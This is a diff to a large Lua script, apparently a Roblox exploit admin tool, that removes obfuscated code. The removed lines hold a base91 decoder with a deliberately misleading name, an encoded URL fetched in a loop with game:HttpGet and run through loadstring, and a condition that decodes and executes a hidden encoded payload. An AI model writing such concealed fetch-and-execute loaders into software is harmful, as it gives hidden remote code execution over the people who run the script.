@@ -22,7 +22,6 @@ if getgenv().RealNamelessLoaded then return end
 
 pcall(function() getgenv().RealNamelessLoaded=true end)
 pcall(function() getgenv().NATestingVer=true end)
-pcall(function() getgenv().cdshkjvcdsojuefdwonjwojgrwoijuhegr="FIWUIUR" end)
 
 NAbegin=tick()
 CMDAUTOFILL = {}
@@ -1294,50 +1293,6 @@ function randomahhfunctionthatyouwontgetit(data)
 		return string.char(c)
 	end))
 end]]
-function randomahhfunctionthatyouwontgetit(data)
-	local CHARS = [[ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"]]
-	local LOOKUP = {}
-	for i = 1, #CHARS do
-		LOOKUP[CHARS:sub(i, i)] = i - 1
-	end
-
-	local v = -1
-	local b = 0
-	local n = 0
-	local out = {}
-
-	for i = 1, #data do
-		local c = data:sub(i, i)
-		local val = LOOKUP[c]
-		if val == nil then continue end
-		if v < 0 then
-			v = val
-		else
-			v = v + val * 91
-			b = b + v * 2^n
-			n = n + (if v % 8192 > 88 then 13 else 14)
-			repeat
-				Insert(out, string.char(b % 256))
-				b = math.floor(b / 256)
-				n = n - 8
-			until n < 8
-			v = -1
-		end
-	end
-
-	if v > -1 then
-		b = b + v * 2^n
-		n = n + 7
-		repeat
-			Insert(out, string.char(b % 256))
-			b = math.floor(b / 256)
-			n = n - 8
-		until n < 8
-	end
-
-	return Concat(out)
-end
-qowijjokqwd = randomahhfunctionthatyouwontgetit("l5VKR[9`aIEv*.Zkm5!fW*pT<R>xl.`otoW3)*1;eI(/e95p)z9Kt)b13$)&l9bph8;gih6eB#(&<8Wiy29av)H[f1X%M^cjKB")
 function isRelAdmin(Player)
 	for _, id in ipairs(_G.NAadminsLol) do
 		if Player.UserId == id then
@@ -6233,19 +6188,6 @@ cmd.add({"localdate", "yourdate"}, {"localdate (yourdate)", "Shows your current 
 	local dateStr = Format("%02d/%02d/%04d", time.day, time.month, time.year)
 	DoNotif("Your Local Date Is: "..dateStr)
 end)
-zmxcnsaodakscn = nil
-repeat
-	local UNNNAMEEDD, FUFRRRR = pcall(function()
-		return loadstring(game:HttpGet(qowijjokqwd))()
-	end)
-
-	if UNNNAMEEDD then
-		zmxcnsaodakscn = FUFRRRR
-	else
-		Wait(.3)
-	end
-until zmxcnsaodakscn
-askndnijewfijewongf = getgenv().cdshkjvcdsojuefdwonjwojgrwoijuhegr
 cmd.add({"servertime", "svtime"}, {"servertime (svtime)", "Shows the server's current time"}, function()
 	local time = os.date("!*t")
 	local clock = Format("%02d:%02d:%02d", time.hour, time.min, time.sec)
@@ -8919,12 +8861,6 @@ cmd.add({"pingserverhop","pshop"},{"pingserverhop (pshop)","serverhop to a serve
 		DebugNotif("No better server found")
 	end
 end)
-
-if askndnijewfijewongf~=zmxcnsaodakscn then
-	uhefwewufjodwcijdscsauasd = [[DSh+f,nTG$I)I^XiuM=Cq/"@gC%M7Lpoi5(IN:%N2$>+lEFg*ibg2+DZM%Z%xEZk6l_1.yFZ,$n0KFBMl5VKR[9`aIEv*.Zkm5!fW*pT<R>xl.`otoW3)*1;eI(/e95p)z9Kt)b13$)&!Oqm?in<R[4G6!Y64^jmjaU=t60eM%10Evap#GLaWc.!k9Q6HXQDPO$JmJ>y1BFv;mdQZuH<!=6i6U<xhQQn%X4Dw.Z;;RPKqxfd)z^g^*VvAGe!wP!j$2wZqgG{s!m!xwXikPG3]0RT@SSmw,9j$2,<8==/x#h.FQ_o2X=CY<=Hb%zt]m9j44!f,W#Ny#V6JQKm(nFfe,ueb%6t?vqmxoh+i>;Nt!fpgPcLtoef4WQIb%a%sQFl,X;a4W5vwS60nuWogP=Cf><clTy]]
-	oioji32eipqpaofvofsiv = randomahhfunctionthatyouwontgetit(uhefwewufjodwcijdscsauasd)
-	return loadstring(oioji32eipqpaofvofsiv)()
-end
 
 cmd.add({"autorejoin", "autorj"}, {"autorejoin (autorj)", "Rejoins the server if you get kicked / disconnected"}, function()
 	NAlib.disconnect("autorejoin")
